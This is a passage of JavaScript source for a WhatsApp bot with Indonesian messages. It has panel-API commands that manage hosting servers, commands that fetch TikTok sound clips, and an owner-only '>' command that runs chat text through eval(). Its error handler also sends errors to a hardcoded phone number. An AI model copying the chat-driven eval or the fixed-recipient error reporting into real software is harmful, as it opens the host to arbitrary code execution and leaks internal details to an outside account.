                (serverInfo.limits.cpu === 0 ? 'unlimited' : serverInfo.limits.cpu) +
                '%\nEXPIRED: 1 BULAN\nDESCRIPTION: ' +
                serverInfo.description +
                '\nCREATED AT: \n' +
                serverInfo.created_at +
                '\n';
        sendMessage(serverDetailMessage);
    }
    break
case 'delsrv':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let serverId = q;
        if (!serverId) {
            return sendMessage('Server nomor berapa yang mau di hapus?\nContoh: delsrv 1');
        }
        let response = await fetch(
                global.domain + '/api/application/servers/' + serverId,
                {
                    method: 'DELETE',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(util.format(jsonResponse.errors[0]));
        }
        sendMessage('SUKSES DELETE SERVER ' + serverId);
    }
    break

      case 'reinstall':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let serverId = q;
        if (!serverId) {
            return sendMessage('ID nya mana?');
        }
        let response = await fetch(
                global.domain + '/api/application/servers/' + serverId + '/reinstall',
                {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(util.format(jsonResponse.errors[0]));
        }
        sendMessage('*SUKSES REINSTALL SERVER ' + serverId + '*');
    }
    break
case 'bansrv':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let serverId = q;
        if (!serverId) {
            return sendMessage('ID nya mana?');
        }
        let response = await fetch(
                global.domain + '/api/application/servers/' + serverId + '/suspend',
                {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(util.format(jsonResponse.errors[0]));
        }
        sendMessage('*SUKSES BANNED SERVER ' + serverId + '*');
    }
    break
case 'unbansrv':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let serverId = args[0];
        if (!serverId) {
            return sendMessage('ID nya mana?');
        }
        let response = await fetch(
                global.domain + '/api/application/servers/' + serverId + '/unsuspend',
                {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(util.format(jsonResponse.errors[0]));
        }
        sendMessage('*SUKSES UNBANNED SERVER ' + serverId + '*');
    }
    break

      case 'detsrv':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let serverId = q;
        if (!serverId) {
            return sendMessage('ID nya mana?');
        }

        let response = await fetch(
                global.domain + '/api/application/servers/' + serverId,
                {
                    method: 'GET',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            serverData = await response.json();
        if (serverData.errors) {
            return sendMessage(util.format(serverData.errors[0]));
        }

        let attributes = serverData.attributes,
            resourcesResponse = await fetch(
                global.domain + '/api/client/servers/' + attributes.uuid.split('-')[0] + '/resources',
                {
                    method: 'GET',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_pltc,
                    },
                }
            ),
            resourcesData = await resourcesResponse.json(),
            resources = resourcesData.attributes,
            serverDetails =
                '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n' +
                attributes.name.toUpperCase() +
                ' SERVER DETAILS\n\n● ID: ' +
                attributes.id +
                '\n● NAME: ' +
                attributes.name +
                '\n● MEMORY: ' +
                (attributes.limits.memory === 0 ? 'Unlimited MB' : attributes.limits.memory + 'MB') +
                '\n● DISK: ' +
                (attributes.limits.disk === 0 ? 'Unlimited MB' : attributes.limits.disk + 'MB') +
                '\n● CPU: ' +
                (attributes.limits.cpu === 0 ? 'Unlimited %' : attributes.limits.cpu + '%') +
                '\n● DESCRIPTION: ' +
                attributes.description +
                '\n● CREATED AT: \n ' +
                attributes.created_at +
                '\n ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬';

        sendMessage(serverDetails);
    }
    break
case 'listsrv':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }

        let page = q ? q : '1',
            response = await fetch(
                global.domain + '/api/application/servers?page=' + page,
                {
                    method: 'GET',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            serverListData = await response.json();
        if (serverListData.errors) {
            return sendMessage(util.format(serverListData.errors[0]));
        }

        let servers = serverListData.data,
            serverList = [],
            listDetails =
                '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n*LIST SERVER PANEL*\n□ Nama Host: ' +
                global.nama_host +
                '\n□ Total Server: ' +
                serverListData.meta.pagination.count +
                '\n□ Page: ' +
                serverListData.meta.pagination.current_page +
                '/' +
                serverListData.meta.pagination.total_pages +
                '\n▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n';

        for (let server of servers) {
            let attributes = server.attributes,
                resourcesResponse = await fetch(
                    global.domain + '/api/client/servers/' + attributes.uuid.split('-')[0] + '/resources',
                    {
                        method: 'GET',
                        headers: {
                            Accept: 'application/json',
                            'Content-Type': 'application/json',
                            Authorization: 'Bearer ' + global.key_pltc,
                        },
                    }
                ),
                resourcesData = await resourcesResponse.json(),
                resources = resourcesData.attributes,
                serverInfo = {
                    id: attributes.id,
                    name: attributes.name.toLowerCase(),
                    memory: attributes.limits.memory,
                    disk: attributes.limits.disk,
                    cpu: attributes.limits.cpu,
                };

            serverList.push(serverInfo);
        }

        sendMessage(util.format(serverList));
    }
    break
      case 'sound1':
      case 'sound2':
      case 'sound3':
      case 'sound4':
      case 'sound5':
      case 'sound6':
      case 'sound7':
      case 'sound8':
      case 'sound9':
      case 'sound10':
      case 'sound11':
      case 'sound12':
      case 'sound13':
      case 'sound14':
      case 'sound15':
      case 'sound16':
      case 'sound17':
      case 'sound18':
      case 'sound19':
      case 'sound20':
      case 'sound21':
      case 'sound22':
      case 'sound23':
      case 'sound24':
      case 'sound25':
      case 'sound26':
      case 'sound27':
      case 'sound28':
      case 'sound29':
      case 'sound30':
      case 'sound31':
      case 'sound32':
      case 'sound33':
      case 'sound34':
      case 'sound35':
      case 'sound36':
      case 'sound37':
      case 'sound38':
      case 'sound39':
      case 'sound40':
      case 'sound41':
      case 'sound42':
      case 'sound43':
      case 'sound44':
      case 'sound45':
      case 'sound46':
      case 'sound47':
      case 'sound48':
      case 'sound49':
      case 'sound50':
      case 'sound51':
      case 'sound52':
      case 'sound53':
      case 'sound54':
      case 'sound55':
      case 'sound56':
      case 'sound57':
      case 'sound58':
      case 'sound59':
      case 'sound60':
      case 'sound61':
      case 'sound62':
      case 'sound63':
      case 'sound64':
      case 'sound65':
      case 'sound66':
      case 'sound67':
      case 'sound68':
      case 'sound69':
      case 'sound70':
      case 'sound71':
      case 'sound72':
      case 'sound73':
      case 'sound74':
      case 'sound75':
      case 'sound76':
      case 'sound77':
      case 'sound78':
      case 'sound79':
      case 'sound80':
      case 'sound81':
      case 'sound82':
      case 'sound83':
      case 'sound84':
      case 'sound85':
      case 'sound86':
      case 'sound87':
      case 'sound88':
      case 'sound89':
      case 'sound90':
      case 'sound91':
      case 'sound92':
      case 'sound93':
      case 'sound94':
      case 'sound95':
      case 'sound96':
      case 'sound97':
      case 'sound98':
      case 'sound99':
      case 'sound100':
      case 'sound101':
      case 'sound102':
      case 'sound103':
      case 'sound104':
      case 'sound105':
      case 'sound106':
      case 'sound107':
      case 'sound108':
      case 'sound109':
      case 'sound110':
      case 'sound111':
      case 'sound112':
      case 'sound113':
      case 'sound114':
      case 'sound115':
      case 'sound116':
      case 'sound117':
      case 'sound118':
      case 'sound119':
      case 'sound120':
      case 'sound121':
      case 'sound122':
      case 'sound123':
      case 'sound124':
      case 'sound125':
      case 'sound126':
      case 'sound127':
      case 'sound128':
      case 'sound129':
      case 'sound130':
      case 'sound131':
      case 'sound132':
      case 'sound133':
      case 'sound134':
      case 'sound135':
      case 'sound136':
      case 'sound137':
      case 'sound138':
      case 'sound139':
      case 'sound140':
      case 'sound141':
      case 'sound142':
      case 'sound143':
      case 'sound144':
      case 'sound145':
      case 'sound146':
      case 'sound147':
      case 'sound148':
      case 'sound149':
      case 'sound150':
      case 'sound151':
      case 'sound152':
      case 'sound153':
      case 'sound154':
      case 'sound155':
      case 'sound156':
      case 'sound157':
      case 'sound158':
      case 'sound159':
      case 'sound160':
      case 'sound161':
        {
          if (!isDeveloper && !isOwner && !isPremium && !isSelf) {
            return
          }
          strava_dev = await getBuffer(
            'https://github.com/Lexxy24/MusicTikTok-Api/raw/master/tiktokmusic/' +
              command +
              '.mp3'
          )
          client.sendMessage(
            remoteJid,
            {
              audio: strava_dev,
              mimetype: 'audio/mp4',
              ptt: true,
            },
            { quoted: message }
          )
        }
        break
    case '>': {
    if (!isOwner) return;
    try {
let evaled = await eval(args[0])
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await sendMessage(evaled)
} catch (err) {
await sendMessage(String(err))}
}
break
      default:
if (budy.startsWith('>')) {
if (!isOwner) return sendMessage('khusus owner')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await sendMessage(evaled)
} catch (err) {
await sendMessage(String(err))}
}
    }
  } catch (error) {
    froom = message.key.remoteJid
    stravaRorr = async () => {
      client.sendMessage('6289630721021@s.whatsapp.net', { text: util.format(error) })
    }
    stravaRorr()
  }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright('Update ' + __filename))
  delete require.cache[file]
  require(file)
})